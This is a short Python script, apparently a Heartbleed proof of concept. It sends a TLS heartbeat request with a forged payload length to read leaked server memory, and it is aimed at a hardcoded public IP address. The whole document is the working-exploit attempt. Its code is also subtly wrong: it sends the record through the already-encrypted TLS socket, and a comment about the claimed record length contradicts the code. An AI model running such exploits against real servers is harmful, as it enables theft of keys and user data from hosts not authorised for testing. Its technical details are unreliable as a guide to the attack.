import socket
import struct
import ssl

def build_heartbeat():
    # Heartbeat message:
    # Type: 0x01 (request)
    # Payload length: 0x4000 (16384) but real payload is only 1 byte
    hb_type = b'\x01'
    payload = b'A'  # 1-byte real payload
    fake_length = struct.pack('>H', 0x4000)  # Claiming payload is 16KB
    return hb_type + fake_length + payload

def send_heartbeat(target, port=443):
    # TLS Client Hello and basic handshake
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((target, port)) as sock:
        with context.wrap_socket(sock, server_hostname=target) as ssock:
            print("[+] Connected, sending Heartbeat...")

            # Send heartbeat request manually using raw socket
            heartbeat = build_heartbeat()

            # TLS record header:
            # Content type: 24 (Heartbeat) = 0x18
            # Version: TLS 1.1 = 0x0302
            # Length: 3 (header) + 1 (payload) = 0x4004 (claimed)
            tls_header = b'\x18\x03\x02' + struct.pack('>H', len(heartbeat))
            record = tls_header + heartbeat

            # Send the malicious record
            ssock.send(record)

            # Try to read leaked memory
            try:
                data = ssock.recv(65535)
                print("[+] Received {} bytes".format(len(data)))
                print(data.hex())
            except Exception as e:
                print("[-] No response or server not vulnerable:", e)

# Change this to a test server
send_heartbeat("3.255.249.93")
